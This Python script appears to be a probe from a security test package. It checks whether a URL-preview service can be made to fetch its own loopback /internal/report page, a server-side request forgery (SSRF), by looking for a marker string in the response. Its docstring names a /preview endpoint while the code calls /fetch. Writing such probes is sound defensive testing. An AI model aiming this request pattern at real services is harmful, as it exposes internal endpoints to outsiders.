#!/usr/bin/env python3
"""Discriminating probe for ssrf-url-preview.

Asks the /preview fetcher to fetch the server's own loopback
/internal/report URL. Exits 0 iff the internal report's marker comes
back through the fetcher (SSRF succeeded); exits 1 otherwise (e.g.
against the patched app, whose fetcher refuses loopback destinations).
"""
import os
import sys
import time
import urllib.parse
import urllib.request

MARKER = "FNDRY-SSRF-4KD81"


def fetch(url):
    req = urllib.request.Request(
        url, headers={"User-Agent": "foundry-probe/1.0"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.read().decode("utf-8", "replace")


def main():
    base = os.environ.get("BASE_URL", "http://127.0.0.1:18080").rstrip("/")
    internal_url = base + "/internal/report"
    url = base + "/fetch?url=" + urllib.parse.quote(internal_url, safe="")
    try:
        body = fetch(url)
    except Exception:
        time.sleep(0.5)  # one retry for startup races only
        try:
            body = fetch(url)
        except Exception:
            return 1
    return 0 if MARKER in body else 1


if __name__ == "__main__":
    sys.exit(main())
